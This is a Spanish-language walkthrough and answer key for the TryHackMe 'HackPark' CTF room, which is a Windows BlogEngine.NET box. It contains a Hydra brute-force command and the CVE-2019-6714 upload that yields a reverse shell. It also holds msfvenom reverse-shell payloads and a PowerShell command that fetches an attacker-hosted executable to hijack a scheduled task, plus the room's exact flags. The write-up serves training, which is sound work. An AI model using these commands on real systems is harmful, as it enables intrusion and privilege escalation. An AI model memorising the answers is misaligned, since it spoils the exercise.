# HackPark

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF | hackpark | https://tryhackme.com/room/hackpark | 02 Level Medium | TryHackMe | BlogEngine.NET, Hydra, Metasploit, WinPEAS, System Scheduler, CVE-2019-6714 | Compromiso total (Administrador) en Windows 2012 R2 |

---

**Contexto:** **HackPark** es un CTF Medium contra una máquina Windows 2012 R2 con un blog BlogEngine.NET. Se resuelve bruteforceando las credenciales del panel (`admin:1qaz2wsx`), explotando el RCE de BlogEngine 3.3.6 (CVE-2019-6714) para obtener una primera shell (`iis apppool\blog`), y escalando por el servicio Windows Scheduler que ejecuta `Message.exe` como administrador. Con WinPEAS y una reverse shell como admin se obtienen las flags de Jeff y de Administrador.

## Solucionario

### Task 1: Deploy the vulnerable Windows machine

**Explicación:** Se despliega la máquina y se accede al servidor web. El sitio es un BlogEngine básico sobre la película "IT", protagonizado por el payaso Pennywise; una reverse image search de la imagen del payaso confirma `pennywise` como nombre del payaso de la homepage.

Respuestas de la tarea:

1. `No answer needed`
2. `pennywise`

### Task 2

**Explicación:** Analizando el tráfico con Burp mientras se intenta `admin:admin`, se comprueba que el formulario de login (`/Account/login.aspx`) usa el método POST y requiere los campos `__VIEWSTATE` y `__EVENTVALIDATION`. Se lanza Hydra contra el login con el usuario `admin` y rockyou.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/Account/login.aspx:__VIEWSTATE=<...>&__EVENTVALIDATION=<...>&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```

Respuestas de la tarea:

1. `POST`
2. `1qaz2wsx`
3. `No answer needed`

### Task 3: Compromise the machine

**Explicación:** Con las credenciales se accede al dashboard. Se identifica la versión de BlogEngine (3.3.6.0) en la sección About y se buscan exploits con searchsploit. El exploit `46353.cs` (Directory Traversal / RCE) se renombra a `PostView.ascx`, se cambia la IP/puerto, se sube vía File Manager y al visitar `/?theme=../../App_Data/files` se obtiene una reverse shell. `whoami` confirma que el servidor corre como `iis apppool\blog`.

```bash
searchsploit blogengine
searchsploit -m aspx/webapps/46353.cs
# renombrar a PostView.ascx, editar LHOST/LPORT, subir y disparar:
curl "http://<IP>/?theme=../../App_Data/files"
nc -lvnp 4444
```

Respuestas de la tarea:

1. `3.3.6.0`
2. `CVE-2019-6714`
3. `iis apppool\blog`

### Task 4: Privilege Escalation

**Explicación:** Con una shell meterpreter estable (`msfvenom` Windows x64), `sysinfo` revela Windows 2012 R2 (6.3 Build 9600). WinPEAS encuentra el servicio anómalo `WindowsScheduler`; en `C:\Program Files (x86)\SystemScheduler\Events` el log muestra que `Message.exe` es ejecutado por el administrador cada 30 segundos. Se sustituye `Message.exe` por una reverse shell (msfvenom) y al esperar el ciclo se obtiene una shell como administrador, leyendo la user flag del escritorio de Jeff y la root flag del escritorio de Administrator.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=1337 -f exe -o Message.exe
# en el objetivo:
rename Message.exe Message.old
powershell Invoke-WebRequest -Uri http://<LHOST>:8000/Message.exe -OutFile Message.exe
type C:\Users\jeff\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

Respuestas de la tarea:

1. `No answer needed`
2. `Windows 2012 R2 (6.3 Build 9600)`
3. `WindowsScheduler`
4. `Message.exe`
5. `759bd8af507517bcfaede78a21a73e39`
6. `7e13d97f05f7ceb9881a3eb3d78d3e72`

### Task 5: Privilege Escalation Without Metasploit

**Explicación:** Alternativa sin Metasploit: WinPEAS también entrega credenciales RDP (`xfreerdp`) para `administrator`, y la salida indica el "Original Install time" de la máquina que responde la última pregunta.

```bash
xfreerdp /u:administrator /v:<IP>:3389 /cert:ignore /p:<password>
```

Respuestas de la tarea:

1. `No answer needed`
2. `No answer needed`
3. `8/3/2019, 10:43:23 AM`

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1.1 | Deploy the machine and access its web server. | `No answer needed` |
| 1.2 | Whats the name of the clown displayed on the homepage? | `pennywise` |
| 2.1 | What request type is the Windows website login form using? | `POST` |
| 2.2 | Guess a username, choose a password wordlist and gain credentials to a user account! | `1qaz2wsx` |
| 2.3 | Log in as admin al blog | `No answer needed` |
| 3.1 | Now you have logged into the website, are you able to identify the version of the BlogEngine? | `3.3.6.0` |
| 3.2 | What is the CVE? | `CVE-2019-6714` |
| 3.3 | Who is the webserver running as? | `iis apppool\blog` |
| 4.1 | Obtener una shell estable (meterpreter) | `No answer needed` |
| 4.2 | What is the OS version of this windows machine? | `Windows 2012 R2 (6.3 Build 9600)` |
| 4.3 | What is the name of the abnormal service running? | `WindowsScheduler` |
| 4.4 | What is the name of the binary you're supposed to exploit? | `Message.exe` |
| 4.5 | What is the user flag (on Jeffs Desktop)? | `759bd8af507517bcfaede78a21a73e39` |
| 4.6 | What is the root flag? | `7e13d97f05f7ceb9881a3eb3d78d3e72` |
| 5.1 | Ejecutar WinPEAS / enumerar | `No answer needed` |
| 5.2 | Explotación sin Metasploit (RDP) | `No answer needed` |
| 5.3 | Using winPeas, what was the Original Install time? (This is date and time) | `8/3/2019, 10:43:23 AM` |

---

**Metodología:** Enumeración web, bruteforce con Hydra, manejo de exploits públicos (searchsploit/Exploit-DB), reverse shell, enumeración de privilegios con WinPEAS, abuso del Windows Scheduler (DLL/EXE hijack de `Message.exe`) y acceso RDP (PTES: vulnerability research, exploitation, privilege escalation).

**Learning chain:** BlogEngine → pennywise (reverse image search) → POST login → hydra → admin:1qaz2wsx → 3.3.6.0 → CVE-2019-6714 (PostView.ascx RCE) → iis apppool\blog → WinPEAS → WindowsScheduler → Message.exe cada 30s → DLL/EXE hijack → admin → user/root flags → WinPEAS Original Install time.

**Lección:** *Los servicios de tareas programadas que ejecutan binarios en directorios modificables por todos (Everyone) son un vector clásico de escalada silenciosa en Windows.*

**MITRE ATT&CK:** T1110 Brute Force (hydra) · T1505.003 Web Shell (PostView.ascx) · T1059.001 Command and Scripting Interpreter (PowerShell) · T1053.005 Scheduled Task (WindowsScheduler) · T1574.002 Hijack Execution Flow (DLL Side-Loading/EXE replacement) · T1003.001 OS Credential Dumping.

**Fuente:** [TryHackMe - HackPark](https://tryhackme.com/room/hackpark)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.